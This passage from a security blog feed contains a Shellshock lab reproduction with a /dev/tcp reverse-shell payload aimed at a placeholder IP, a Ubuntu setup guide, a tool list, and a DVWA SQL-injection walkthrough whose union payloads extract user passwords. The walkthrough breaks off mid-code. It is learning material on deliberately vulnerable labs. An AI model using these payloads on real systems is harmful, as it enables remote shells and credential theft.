src="https://jerhxw.sn.files.1drv.com/y4m3avDf5z1yuhbp6JGIoA6TRYPqr23TePT-XJD4tRbHDmKyPa0bH8nZHd5iChzik6XRtwxL2TZee_3uAqTX_pdCZF-uSpeqAxkkgKu5F5047GLcsoyIL3wH-bj2n34gGGEqGIzHr3oe1I_okAhIyvHi1vyHtindHYlT_dqsxOuoYKnGmGpvrezvqAYc8qf5GXvsR-4YpLK9D9sjbu_pKANTQ?width=1251&height=763&cropmode=none" alt></p><p>明显执行成功</p><ol start="5"><li>那么弹shell也不在话下<code>() { :;}; /bin/bash -i &gt;&amp; /dev/tcp/[弹到你的公网ip]/[端口号] 0&gt;&amp;1;</code></li></ol><p><img src="https://jergxw.sn.files.1drv.com/y4mAl-bLF4eNEkLoyPQLLkgHKMF4LxU_302AYKh3ZOvU5i6YzDh-4Lf13g5DEHhZIXso9pf_WME-aZYHrD90lGJI9OesfH8fx1gCmtCKwmiq_UVZjrguCRgs1pwOuEFHmwWlUkfDwJGxHWE4pFw80p-4ofj08FQz0iG28lud-VtjeBv8KWlNPVHJa-Jtx34x7v4EFBDd2APUmkx_AnhrUnHEA?width=1327&height=334&cropmode=none" alt></p><p>   测试成功</p><ol start="6"><li><p>来自官方说明:部分嵌入式设备的环境变量未设置会导致一些命令需要使用绝对路径，可在执行命令前导入环境变量</p><p><code>User-Agent: () { :;};echo ; echo; export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; echo $(/bin/ls -al /);</code></p></li></ol><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote><p>进入到环境中<code>docker exec -it dazzling_tu /bin/bash</code><br>进入poc.cgi所在目录<code>cd /usr/local/apache2/cgi-bin</code><br>查看poc.cgi的内容<code>cat poc.cgi</code></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Content-type: text/html"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">""</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;html&gt;'</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;head&gt;'</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8"&gt;'</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;title&gt;Bash ShellShock&lt;/title&gt;'</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;/head&gt;'</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;body&gt;'</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;pre&gt;'</span></span><br><span class="line">/usr/bin/env</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;/pre&gt;'</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;/body&gt;'</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;/html&gt;'</span></span><br></pre></td></tr></table></figure><p>漏洞就是在这里<code>/usr/bin/env</code>产生的</p><p>大致流程如下:</p><blockquote><ol><li>HTTP 头参数传入</li><li>env 环境变量接受到参数</li><li>bash 执行环境变量中的字符串(黑客构造好的 payload 在这里执行)</li><li>结果保存在当前会话的环境变量中随着 response 返回到客户端</li><li>黑客愉快的进下一步操作</li></ol></blockquote><p>经验+1:扫到/cgi-bin/ .cgi .sh 等目录或文件可以进行有关bash代码注入的测试</p><p>payload: <code>() { :;}; echo ; echo ; echo &quot;this test is success!&quot;;</code></p><p>参考文章:<br><a href="https://github.com/Medicean/VulApps/blob/master/b/bash/shellshock1_CVE-2014-6271/README.md" target="_blank" rel="noopener">https://github.com/Medicean/VulApps/blob/master/b/bash/shellshock1_CVE-2014-6271/README.md</a><br><a href="https://www.cnblogs.com/qmfsun/p/7591757.html" target="_blank" rel="noopener">https://www.cnblogs.com/qmfsun/p/7591757.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;分析&quot;&gt;&lt;a href=&quot;#分析&quot; class=&quot;headerlink&quot; title=&quot;分析&quot;&gt;&lt;/a&gt;分析&lt;/h1&gt;&lt;h2 id=&quot;CGI&quot;&gt;&lt;a href=&quot;#CGI&quot; class=&quot;headerlink&quot; title=&quot;CGI&quot;&gt;&lt;/a&gt;CGI&lt;/h2&gt;&lt;p&gt;CGI全称是“公共网关接口”(Common Gateway Interface)，HTTP服务器与你的或其它机器上的程序进行“交谈”的一种工具，其程序须运行在网络服务器上。&lt;br&gt;CGI可以用任何一种语言编写，只要这种语言具有标准输入、输出和环境变量。&lt;br&gt;CGI环境变量列表:&lt;br&gt;    SERVER-NAME:运行CGI序为机器名或IP地址。&lt;br&gt;　　SERVER-INTERFACE:WWW服务器的类型，如:CERN型或NCSA型。&lt;br&gt;　　SERVER-PROTOCOL:通信协议，应当是HTTP/1.0。&lt;br&gt;　　SERVER-PORT:TCP端口，一般说来web端口是80。&lt;br&gt;　　HTTP-ACCEPT:HTTP定义的浏览器能够接受的数据类型。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞复现" scheme="http://AbelChe.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="远程代码执行" scheme="http://AbelChe.com/tags/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    
      <category term="cgi" scheme="http://AbelChe.com/tags/cgi/"/>
    
  </entry>
  
  <entry>
    <title>常用工具集(持续更新)</title>
    <link href="http://AbelChe.com/2019/07/25/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E9%9B%86%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/"/>
    <id>http://AbelChe.com/2019/07/25/常用工具集（持续更新）/</id>
    <published>2019-07-25T05:36:05.000Z</published>
    <updated>2019-08-15T11:02:50.014Z</updated>
    
    <content type="html"><![CDATA[<h1 id="扫描器"><a href="#扫描器" class="headerlink" title="扫描器"></a>扫描器</h1><h2 id="web目录扫描器"><a href="#web目录扫描器" class="headerlink" title="web目录扫描器"></a>web目录扫描器</h2><ul><li>跨平台的web目录扫描器 <a href="https://github.com/AbelChe/webdirscan" target="_blank" rel="noopener">https://github.com/AbelChe/webdirscan</a></li><li>动态多线程敏感信息泄露检测工具 <a href="https://github.com/AbelChe/weakfilescan" target="_blank" rel="noopener">https://github.com/AbelChe/weakfilescan</a></li><li>快速地对大量目标进行扫描 <a href="https://github.com/lijiejie/BBScan" target="_blank" rel="noopener">https://github.com/lijiejie/BBScan</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;扫描器&quot;&gt;&lt;a href=&quot;#扫描器&quot; class=&quot;headerlink&quot; title=&quot;扫描器&quot;&gt;&lt;/a&gt;扫描器&lt;/h1&gt;&lt;h2 id=&quot;web目录扫描器&quot;&gt;&lt;a href=&quot;#web目录扫描器&quot; class=&quot;headerlink&quot; title=&quot;web目录
      
    
    </summary>
    
      <category term="工具" scheme="http://AbelChe.com/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="渗透" scheme="http://AbelChe.com/tags/%E6%B8%97%E9%80%8F/"/>
    
      <category term="工具" scheme="http://AbelChe.com/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu1804 折腾全集</title>
    <link href="http://AbelChe.com/2019/06/27/Ubuntu1804%20%E6%8A%98%E8%85%BE%E5%85%A8%E9%9B%86/"/>
    <id>http://AbelChe.com/2019/06/27/Ubuntu1804 折腾全集/</id>
    <published>2019-06-27T12:01:10.000Z</published>
    <updated>2019-08-15T11:02:50.013Z</updated>
    
    <content type="html"><![CDATA[<h1 id="安装-Ubuntu1804"><a href="#安装-Ubuntu1804" class="headerlink" title="安装 Ubuntu1804"></a>安装 Ubuntu1804</h1><h2 id="下载系统镜像"><a href="#下载系统镜像" class="headerlink" title="下载系统镜像"></a>下载系统镜像</h2><p><a href="https://ubuntu.com/download/desktop" title="官方下载地址" target="_blank" rel="noopener">https://ubuntu.com/download/desktop</a></p><h2 id="安装系统"><a href="#安装系统" class="headerlink" title="安装系统"></a>安装系统</h2><ol><li>将下载到的镜像用 Win32DiskImager 等镜像写入工具写入到一个足够大小的 U 盘上</li><li>安装时选择 U 盘启动，跟着引导一步一步往下走</li><li>磁盘分区: 清空整个磁盘为将整块磁盘格式化后安装系统，盘上还有资料的不要选；自定义分区，可以参考这盘文章<a href="https://blog.csdn.net/u012052268/article/details/77145427/" target="_blank" rel="noopener">https://blog.csdn.net/u012052268/article/details/77145427/</a>或者自己百度，要注意分完区要选择引导的安装位置，一般是你所安装的这块磁盘，而不是boot分区！！！</li><li>然后就等着安装完成重启电脑就 OK 了</li></ol><h2 id="如果你是-Nvidia-用户"><a href="#如果你是-Nvidia-用户" class="headerlink" title="(如果你是 Nvidia 用户)"></a>(如果你是 Nvidia 用户)</h2><blockquote><p>如果你是 Nvidia 用户，那么恭喜你，你会发现重启电脑进入系统卡死在 logo 页面死活进不去系统<br>这是因为 linux 系统的 nauveau 开源显卡驱动的原因，解决方案如下:<br>引导时先选到进入系统的选项，按 e 键，找到倒数第二行的 quiet splash ，在后面添加 acpi_osi=linux nomodeset(splash后面别忘了加个空格哈) 再按 ctrl+x 引导即可进入系统。<br>进入系统后打开软件更新器，找到附加驱动，它会检测你合适的官方驱动，找一个稳定的安装就行了。</p></blockquote><h1 id="优化你的-Ubuntu"><a href="#优化你的-Ubuntu" class="headerlink" title="优化你的 Ubuntu"></a>优化你的 Ubuntu</h1><h2 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h2><p>国内用户第一件事一定要换源！换源！换源！<br>先备份一下默认源</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /etc/apt/sources<span class="selector-class">.list</span> /etc/apt/sources<span class="selector-class">.list</span><span class="selector-class">.bak</span></span><br></pre></td></tr></table></figure><p>然后用下面的源替换掉原来的源</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="keyword">vi</span> /etc/apt/sources.<span class="keyword">list</span></span><br></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">deb http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> xenial main</span><br><span class="line">deb-src http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> xenial main</span><br><span class="line"></span><br><span class="line">deb http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> xenial-updates main</span><br><span class="line">deb-src http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> xenial-updates main</span><br><span class="line"></span><br><span class="line">deb http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> xenial universe</span><br><span class="line">deb-src http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> xenial universe</span><br><span class="line">deb http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> xenial-updates universe</span><br><span class="line">deb-src http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> xenial-updates universe</span><br><span class="line"></span><br><span class="line">deb http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> xenial-security main</span><br><span class="line">deb-src http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> xenial-security main</span><br><span class="line">deb http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> xenial-security universe</span><br><span class="line">deb-src http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> xenial-security universe</span><br></pre></td></tr></table></figure><p>然后更新</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="builtin-name">get</span> update</span><br><span class="line">sudo apt-<span class="builtin-name">get</span> upgrade</span><br><span class="line">sudo apt-<span class="builtin-name">get</span> -f install</span><br></pre></td></tr></table></figure><h2 id="安装常用软件-环境"><a href="#安装常用软件-环境" class="headerlink" title="安装常用软件 环境"></a>安装常用软件 环境</h2><ul><li><p>vim</p><p><code>sudo apt-get install vim</code></p></li><li><p>gedit</p><p><code>sudo apt-get install gedit</code></p></li><li><p>ssh</p><p><code>sudo apt-get install ssh</code></p></li><li><p>apache</p><p><code>sudo apt-get install apache2</code></p></li><li><p>mysql</p><p><code>sudo apt-get install mysql-server</code></p></li><li><p>pycharm</p><p>商店里面搜索就可以下载</p></li><li><p>vscode</p><p>商店里搜索</p></li><li><p>网易云音乐</p><p>去官网下载安装包，双击安装</p></li><li><p>qq 微信 百度网盘 迅雷等(有些必要的运行库可能会与系统冲突，慎重)</p><p><a href="https://github.com/AbelChe/deepin-wine-ubuntu" target="_blank" rel="noopener">https://github.com/AbelChe/deepin-wine-ubuntu</a></p></li><li><p>docker</p><p><code>sudo apt-get install docker docker.io docker-compose</code></p></li></ul><h1 id="美化"><a href="#美化" class="headerlink" title="美化"></a>美化</h1><p><a href="https://www.jianshu.com/p/f9e905abea91" target="_blank" rel="noopener">https://www.jianshu.com/p/f9e905abea91</a>差不多了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;安装-Ubuntu1804&quot;&gt;&lt;a href=&quot;#安装-Ubuntu1804&quot; class=&quot;headerlink&quot; title=&quot;安装 Ubuntu1804&quot;&gt;&lt;/a&gt;安装 Ubuntu1804&lt;/h1&gt;&lt;h2 id=&quot;下载系统镜像&quot;&gt;&lt;a href=&quot;#下载系
      
    
    </summary>
    
      <category term="linux" scheme="http://AbelChe.com/categories/linux/"/>
    
    
      <category term="linux" scheme="http://AbelChe.com/tags/linux/"/>
    
      <category term="Ubuntu" scheme="http://AbelChe.com/tags/Ubuntu/"/>
    
      <category term="美化" scheme="http://AbelChe.com/tags/%E7%BE%8E%E5%8C%96/"/>
    
      <category term="配置环境" scheme="http://AbelChe.com/tags/%E9%85%8D%E7%BD%AE%E7%8E%AF%E5%A2%83/"/>
    
  </entry>
  
  <entry>
    <title>利用DVWA进行简单的漏洞学习</title>
    <link href="http://AbelChe.com/2019/04/25/%E5%88%A9%E7%94%A8DVWA%E8%BF%9B%E8%A1%8C%E7%AE%80%E5%8D%95%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    <id>http://AbelChe.com/2019/04/25/利用DVWA进行简单的漏洞学习/</id>
    <published>2019-04-25T14:05:56.000Z</published>
    <updated>2019-08-15T11:02:50.013Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h1><h2 id="Low-Level"><a href="#Low-Level" class="headerlink" title="Low Level"></a>Low Level</h2><h3 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h3><p>在输入框中输入1，然后提交<br>得到如下内容<br><img src="https://sawvsg.bn.files.1drv.com/y4mPaxBNf7c6hbB6aYNDT1sJHWgI_xKoHA5blVRONulxCxy0OVOFZiewYCc8ug86Y9xGe4MMLwJ5Xh39ioUkevQ-UwfX6O3Ss0DulnJCKpQ6x8eDihDFAaj-hrVJ9lvQqVPrDfO0DTdSxjFKgtk1ca-Km-PgA0NU8Xl3vaj491Lt98zN284L-EoiUTtIXDXDPxEG4a5idDqhv-zv3xpUHZFgA?width=281&height=95&cropmode=none" width="281" height="95"><br>输入1’，提交得到<code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;1&#39;&#39;&#39; at line 1</code><br>说明存在字符型的SQL注入。</p><h3 id="猜解字段数"><a href="#猜解字段数" class="headerlink" title="猜解字段数"></a>猜解字段数</h3><p>通过<code>order by</code>进行猜解字段数<br><code>1&#39; order by 1#</code>正常<br><code>1&#39; order by 2#</code>正常<br><code>1&#39; order by 3#</code>返回错误<br>说明查询的字段数是两个<br>那么查询语句的结构差不多就是<code>select &lt;name1&gt;,&lt;name2&gt; from &lt;table&gt; where &lt;id&gt;=&lt;value&gt;;</code></p><h3 id="尝试爆出所有字段"><a href="#尝试爆出所有字段" class="headerlink" title="尝试爆出所有字段"></a>尝试爆出所有字段</h3><p>那么我们可以尝试构造<code>1&#39; or &#39;1&#39;=&#39;1</code>来爆出所查询的表里的所有字段(因为是字符型注入，所以要考虑引号的闭合)<br><img src="https://sawtsg.bn.files.1drv.com/y4mYZKTtiGH602vL3dUx6Wefx1Frvo3AjwFW3qoOWTaNH6iclFgqni4PrHcBIHyt2owWmSNv77nHS5KPPBTsAo9lLDmAzCGbekWRHW3DVAQCxN9fdJ8rnJCC4189jol_LxN5Ig55fJsvOfHuWUSGuf4rxaj7xNHtHWx60O9FzKJSZZTsP7eqCLuJAgz0gRwAC7v23Fw96pa9gMswqQp4BWIHQ?width=284&height=327&cropmode=none" width="284" height="327"><br>还原成SQL语句即为<code>select &lt;name1&gt;,&lt;name2&gt; from &lt;table&gt; where &lt;id&gt;=1 or 1=1;</code></p><h3 id="union拼接查询敏感信息"><a href="#union拼接查询敏感信息" class="headerlink" title="union拼接查询敏感信息"></a>union拼接查询敏感信息</h3><p>使用联合查询 union 可以爆出我们想知道的一些数据库敏感信息<br><a href="https://www.jianshu.com/p/ea15158f39f7" target="_blank" rel="noopener">关于MySQL的information_schema库</a><br>爆出数据库名</p><p><code>1&#39; union select database(),2;#</code><br><img src="https://sawwsg.dm.files.1drv.com/y4mLzUEkcM3F3ydTzBNwS5hch-OJZ2GS11vrq3meDkq2z80U4f8Lv1lU6gnYEkInUXiVSx0PhiuQ0uVzx3Tp_IFzNAvHdRFWWf8YK0o2ov588sjBnqCO-nreiM6-4kipDzVsN7vqLAQ6dGxKlRWZ36QOhFDgxwf6ehfm7WKUqP-YNWA6y-h4kCWzEf_WZ-xNx2kYPXaee44m-Fa_BAg_uWdQw?width=285&height=149&cropmode=none" width="285" height="149"><br>爆出数据库表<br><code>1&#39; union select 1,table_name from information_schema.tables where table_schema=&#39;dvwa&#39;#</code><br><img src="https://sqwnsg.by.files.1drv.com/y4mSW--M2dh7VCFFAS4jsUGgGEjKLGm105uI78kieOyS15UB_gT7lpuI93eFE7rZSv35tBOeWWsIIVsd1H8tEkrH-oKVQn8apNPdGzNTS-LIKcQ4915UaoTd9iGyAiJoJblJU2yxlb9vGpp0kIVA9z1QSXFbmVbK6koHISQg7Lm-91LLwWIMmFPhMThWuc5Q2rnovRp6fweZDNpNS2ZzBUAMA?width=610&height=209&cropmode=none" width="610" height="209"><br>爆出表中的所有列<br><code>1&#39; union select 1,column_name from information_schema.columns where table_name=&#39;users&#39;#</code><br><img src="https://sqwosg.bn.files.1drv.com/y4mmkEAtD0FfoKaTcBldPkG19MwAhILObO7FAemlmHAf4JhRAlarTEd8h6DaL7ftwwnB6tOjpdB7su6-SAUZiXlZqbAoq1RcjydrHbmMlX9INiuuco1vhg33KXyEHXNFa-8WJoBFqZLqSC_ndYnx5pye0SLgyXCSdOdrMAPP-WNds4h7pxtFC2y8k7t-EpgHcukRpNKRnIp4ms3aiXUJkrnag?width=621&height=554&cropmode=none" width="621" height="554"><br>查出用户名和密码<br><code>1&#39; union select user,password from users#</code><br><img src="https://sawusg.dm.files.1drv.com/y4mVcVCtinKTUMlh3Eoy9Jf0SfmEtW9GdMUMzb3ZTPx64uzVOjGyyrVDlFMar1UcWf2MzSFSJ0HBzEDCtM1ra9xUfAMZt3FG-bOhOTXbE_WWpTZyY0n0gZr-V7_vfBna3qBGac7QVO2lo5XaA_Vo7awnfb42_o-D2cwFdUsFIkZw0gHDT664i2zGgeptuNi4a8kkIRloRj80-Eh9sYpK0z4Ig?width=380&height=382&cropmode=none" width="380" height="382"></p><h3 id="审计源码和总结"><a href="#审计源码和总结" class="headerlink" title="审计源码和总结"></a>审计源码和总结</h3><p>源码如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_REQUEST[ <span class="string">'Submit'</span> ] ) ) &#123;</span></span><br><span class="line"><span class="php">    <span class="comment">// Get input</span></span></span><br><span class="line"><span class="php">    $id = $_REQUEST[ <span class="string">'id'</span> ];</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="comment">// Check database</span></span></span><br><span class="line"><span class="php">    $query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id';"</span>;</span></span><br><span class="line"><span class="php">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="comment">// Get results</span></span></span><br><span class="line"><span class="php">    <span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;</span></span><br><span class="line"><span class="php">        <span class="comment">// Get values</span></span></span><br><span class="line"><span class="php">        $first = $row[<span class="string">"first_name"</span>];</span></span><br><span class="line"><span class="php">        $last  = $row[<span class="string">"last_name"</span>];</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        <span class="comment">// Feedback for end user</span></span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>可以看到程序没有对输入的变量<code>$id</code>做任何安全处理，这也直接导致了sql注入的产生</p><h2 id="Medium-Level"><a href="#Medium-Level" class="headerlink" title="Medium Level"></a>Medium Level</h2><p>选择Medium等级，发现对输入做了明显的输入限制，从自由输入变为选择id<br>虽然我们在页面上无法进行输入，但是我们可以通过抓包更改数据的方式进行SQL注入</p><blockquote><p>配好代理，打开bp开始抓包，抓到数据包发现是数字型注入，方式和low等级方式基本相同<br>要注意的是转义了’等符号，在提交时会将’，”等符号转义为&#39;，&quot;<br>所以在payload中不要出现引号</p></blockquote><p>先order by查字段数</p><p><code>id=1 or 1=1</code><br><img src="https://sawrsg.bn.files.1drv.com/y4mykvYcaeaOz4H0GYQBi_mJAgeW4GGa5HcCOBe3WR_SXJf7kvwOpCYsuXZx-XXW8Y43aJr9ftJoLec_HFqrfFY5PSCeeG12YzU_tGvYwa0irJfmK9v7PMTHR5QUDLUJf7EoAtmC-Feg_vtAFLj7jpb3bfgttNfRoR8SOp7S3xcegNdGJCotChTcdrL2JiV-l8r9GzysOw7ZROlSiyxVGYsTg?width=1881&height=495&cropmode=none" alt><br><code>id=1 union select database(),2</code><br><img src="https://sawssg.by.files.1drv.com/y4m3DOyCV0C8ZhP6oCVztMEi9eSyENRi3iQbV_IJEGPOnQOvCrxgf9LVI_WHOUbqnbFeEjtCDqPl5eD7bRtHOyxk8sWBNJAS0AiZQusQmrs-G2TPfXXaB3PTeowLOMCM1-XyASAw9VS8VQhjZYIIBcVr6D6M7t4gnZJd5vabA2bpljjabFCnWfx3ikVDmvS3KaTDprf7NNCZg0sCeX5AFTBAA?width=1840&height=362&cropmode=none" alt><br><code>id=1 union select table_name,2 from information_schema.tables where table_schema=database()</code><br><img src="https://sawpsg.dm.files.1drv.com/y4mr8gy0yq15wG5MExK6ENulC387ulNcSdip3gSONsEDlRjXVfqn37IAQSNYQNPnoeed9a1kBWIvzLWxc-vSfF_bDPRXbXFbxv8PKDUKq67EsdzSolb9oZtiSNprKQkgbFrg6KZ43QQ-Szi5NZ6d10QEhX0Ngxi_8eG5DOHZ78lgk0GxkGXFWE6C4JQg9DegtN3xdHA_E3kv9Id-woyjqajwQ?width=1877&height=395&cropmode=none" alt><br>因为转移了引号，所以这里的表名用16进制进行绕过引号<code>id=1 union select 1,group_concat(column_name) from information_schema.columns where  table_name=0x75736572</code><br><img src="https://sawqsg.dm.files.1drv.com/y4mLBu0viVRqa0Aum6vc5gV_-mIpuqFetYkSTvf4T-mgDs4PPFLaGa-WY7UT60dZAkEYGDVMPrOuxrFd6oMt3upu1LFhRWgApF5rrJWqaTHTplG67nVum-XSmveLAn8tmmyZtCqwUQ14Mm5SQOzUz3DT6TMzu8SpMilOlwlzmKgzX0i1vCfOYETuFMb3-4Evo5FXwTY5hKpw29kMQnyxSaXLw?width=1896&height=348&cropmode=none" alt><br><code>id=1 union select user,password from users</code><br><img src="https://sawnsg.bn.files.1drv.com/y4mlRwgdtfBgh36KjGfIPP734mlOLSWIZpQjWN8ezwEJtpgd3SOAJP7E5x9khXLo1Hce2BHXI5_69Pfd5Mz46aXb2aR1JX3L6H6bmE7sEeYHTRoAsjuriMvTG3qAPZiQjgz-kzmiJpXlLN1zaxYnt7FPqrtjgJfRYzAwavrq3VqE0tQWi762sh4w1HYBc1pwomYAEDdcKx8UIYvmV8d_ePgJA?width=1884&height=303&cropmode=none" alt></p><h2 id="High-Leavel"><a href="#High-Leavel" class="headerlink" title="High Leavel"></a>High Leavel</h2><p>分析 high 等级的源码</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_SESSION [ <span class="string">'id'</span> ] ) ) &#123;</span></span><br><span class="line"><span class="php">    <span class="comment">// Get input</span></span></span><br><span class="line"><span class="php">    $id = $_SESSION[ <span class="string">'id'</span> ];</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="comment">// Check database</span></span></span><br><span class="line"><span class="php">    $query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;"</span>;</span></span><br><span class="line"><span class="php">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>], $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;Something went wrong.&lt;/pre&gt;'</span> );</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="comment">// Get results</span></span></span><br><span class="line"><span class="php">    <span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;</span></span><br><span class="line"><span class="php">        <span class="comment">// Get values</span></span></span><br><span class="line"><span class="php">        $first = $row[<span class="string">"first_name"</span>];</span></span><br><span class="line"><span class="php">        $last  = $row[<span class="string">"last_name"</span>];</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        <span class="comment">// Feedback for end user</span></span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span 